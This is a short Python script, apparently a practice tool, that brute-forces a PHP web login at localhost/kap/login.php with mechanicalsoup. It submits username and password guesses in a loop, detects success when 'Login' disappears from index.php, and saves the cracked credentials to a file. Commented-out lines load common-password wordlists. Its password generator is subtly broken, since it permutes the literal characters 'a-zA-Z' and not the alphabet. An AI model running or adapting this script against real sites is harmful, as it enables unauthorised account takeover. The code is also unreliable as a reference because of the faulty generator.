import mechanicalsoup
import itertools
# from numpy import loadtxt

browser = mechanicalsoup.StatefulBrowser()
username = ["user", "admin", "username"]
# passwords = ["admin", "password", "jhgqiMKW4K3WQdH"]
combinations = itertools.permutations("a-zA-Z", 5)

# username = loadtxt('probable-v2-top12000.txt', dtype=str)
# passwords = loadtxt('middle-names.txt', dtype=str)

i = 0
j = 0
f = open("result2.txt", "w")

for username in username:
    i = i + 1
    print("attempt - " + str(i))
    for pwd in combinations:
        browser.open("http://localhost/kap/login.php")
        browser.select_form('form[action="login.php"]')
        password = ''.join(pwd)
        browser["username"] = username
        browser["password"] = password
        j = j + 1
        print("\nTry - " + str(j))
        print("user : " + username)
        print("pass : " + password)
        browser.submit_selected()
        cek = browser.open("http://localhost/kap/index.php")
        if "Login" not in cek.text:
            f.write("username: " + username)
            f.write("\n")
            f.write("password: " + password)
            f.write("\n")
            browser.open("http://localhost/kap/logout.php")
            break
f.close()

    # cek = browser.open("http://localhost/kap/index.php")
    # for password in passwords:
    # while "Login" in cek.text:
    #     browser.open("http://localhost/kap/login.php")
    #     browser.select_form('form[action="login.php"]')
        # pwd = random.choices(passwords, k=15)
        # password = "".join(pwd)
        # browser["username"] = username
        # browser["password"] = password
        # print("try un - " + username)
        # print("try pw - " + str(password) + "\n")
        # browser.submit_selected()
        # cek = browser.open("http://localhost/kap/index.php")
        # print(cek.text)
#         if "Login" not in cek.text:
#             f.write("username: " + username)
#             f.write("\n")
#             f.write("password: " + password)
#             f.write("\n")
#             browser.open("http://localhost/kap/logout.php")
#             break
# f.close()
